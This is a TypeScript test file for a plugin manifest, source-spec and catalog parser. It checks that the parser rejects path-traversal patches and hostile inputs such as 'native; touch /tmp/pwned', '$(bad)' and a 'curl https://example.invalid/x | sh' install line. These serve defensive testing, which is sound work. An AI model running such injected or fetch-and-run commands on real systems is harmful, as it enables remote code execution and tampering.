import { describe, expect, it } from "vitest";
import { parseDshCatalog, parseDshManifest, parseDshSource } from "../src/dsh-plugins/index.js";

describe("native DSH package admission", () => {
  it("preserves scoped identity, raw metadata and ordered Bundle/Profile declarations", () => {
    const raw = {
      name: "@example/native",
      version: "1.2.3",
      main: "lib/index.js",
      exports: { ".": { import: "./lib/index.js" }, "./client": "./client/client.js" },
      author: { name: "Example", url: "https://example.invalid" },
      license: "MIT",
      dsh: {
        bundle: { patch: ["./first.yml", "./second.yml"] },
        profile: { bundles: ["base", "native"] },
        client: { inject: ["ui-settings"] },
      },
      peerDependencies: { "@deepseek-ai/cordis": "~4.1.0" },
      scripts: { prepare: "node build.mjs" },
    };
    const manifest = parseDshManifest(raw);
    expect(manifest.name).toBe("@example/native");
    expect(manifest.bundlePatches).toEqual(["./first.yml", "./second.yml"]);
    expect(manifest.profileBundles).toEqual(["base", "native"]);
    expect(manifest.clientEntry).toBe("./client/client.js");
    expect(manifest.raw).toEqual(raw);
    expect(manifest.scripts.prepare).toBe("node build.mjs");
  });

  it("rejects executable entries or patches escaping the original package", () => {
    for (const field of [
      { main: "../outside.js" },
      { exports: { "./client": "/outside.js" } },
      { dsh: { bundle: { patch: "../../secret.yml" } } },
      { dsh: { bundle: { patch: "..\\outside.yml" } } },
    ]) {
      expect(() => parseDshManifest({ name: "native", version: "1.0.0", ...field })).toThrow();
    }
  });

  it("rejects malformed DSH metadata rather than silently dropping declared capabilities", () => {
    for (const dsh of [
      true,
      { bundle: { patch: 4 } },
      { profile: { bundles: "base" } },
      { client: { inject: [42] } },
    ]) {
      expect(() =>
        parseDshManifest({ name: "native", version: "1.0.0", main: "index.js", dsh }),
      ).toThrow();
    }
  });

  it("parses npm and GitHub specs without evaluating command text", () => {
    expect(parseDshSource("@scope/plugin@1.2.3")).toEqual({
      kind: "npm",
      packageName: "@scope/plugin",
      spec: "@scope/plugin@1.2.3",
    });
    expect(parseDshSource("github:owner/repo#abc123")).toEqual({
      kind: "github",
      repository: "owner/repo",
      ref: "abc123",
      spec: "github:owner/repo#abc123",
    });
    for (const source of [
      "--config.shell-emulator=true",
      "native; touch /tmp/pwned",
      "$(bad)",
      "native\n--registry=bad",
      "https://user:secret@example.invalid/plugin.tgz",
      "http://example.invalid/plugin.tgz",
    ]) {
      expect(() => parseDshSource(source)).toThrow();
    }
  });

  it("ingests real community catalog shape while treating verified as advisory", () => {
    const catalog = parseDshCatalog(
      {
        name: "Example catalog",
        plugins: [
          {
            owner: "alice",
            name: "native",
            npm: "@alice/native",
            version: "1.2.3",
            url: "https://github.com/alice/native",
            description: { en: "Native tools", zh: "原生工具" },
            capabilities: ["fs-read", "subagent"],
            verified: true,
            install: "dsh plugin --profile web add @alice/native",
          },
          {
            id: "other",
            name: "Other",
            version: "2.0.0",
            description: "Other",
            author: { name: "Bob" },
            license: "MIT",
            repository: "https://github.com/bob/other",
            install: { target: "npm", spec: "other@2.0.0", command: "do-not-execute" },
          },
          { name: "bad", install: "curl https://example.invalid/x | sh" },
        ],
      },
      "https://example.invalid/plugins.json",
    );
    expect(catalog.entries).toHaveLength(2);
    expect(catalog.entries[0]).toMatchObject({
      name: "native",
      packageName: "@alice/native",
      author: "alice",
      version: "1.2.3",
      compatibility: "unverified",
      capabilities: ["fs-read", "subagent"],
    });
    expect(catalog.entries[0]?.source.spec).toBe("@alice/native@1.2.3");
    expect(catalog.entries[1]).toMatchObject({
      name: "Other",
      author: "Bob",
      license: "MIT",
      compatibility: "unverified",
    });
    expect(catalog.diagnostics).toHaveLength(1);
  });

  it("keeps same-named publishers distinct and rejects duplicate source identities", () => {
    const catalog = parseDshCatalog(
      {
        plugins: [
          { owner: "alice", name: "same", npm: "@alice/same" },
          { owner: "bob", name: "same", npm: "@bob/same" },
          { owner: "alice", name: "same", npm: "@alice/same" },
        ],
      },
      "https://example.invalid/plugins.json",
    );
    expect(new Set(catalog.entries.map((entry) => entry.id)).size).toBe(2);
    expect(catalog.diagnostics).toHaveLength(1);
  });
});
